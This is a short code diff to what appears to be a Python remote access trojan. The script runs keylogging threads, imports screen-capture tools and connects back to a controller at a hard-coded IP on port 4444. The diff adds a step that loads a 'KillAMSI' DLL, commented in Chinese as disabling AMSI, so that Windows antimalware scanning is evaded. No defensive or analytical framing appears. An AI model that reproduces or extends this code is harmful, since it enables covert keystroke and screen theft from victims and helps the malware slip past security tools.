@@ -18,6 +18,7 @@ import win32security
 import threading
 import pynput
 import datetime
+import ctypes
 from PIL import ImageGrab, Image
 
 IP, PORT = '192.168.0.103', 4444
@@ -86,6 +87,10 @@ if not is_admin():
 # 启动后台持续运行线程（守护线程，主线程退出时自动结束）
 threading.Thread(target=background_worker_keylog, daemon=True, name="BackgroundWorker").start()
 threading.Thread(target=background_worker_datetime, daemon=True, name="BackgroundWorker").start()
+
+#废掉AMSI
+killamsi=ctypes.CDLL('./KillAMSI.dll')
+killamsi.KillAmsi.restype = ctypes.c_int
 
 while True:
     try:
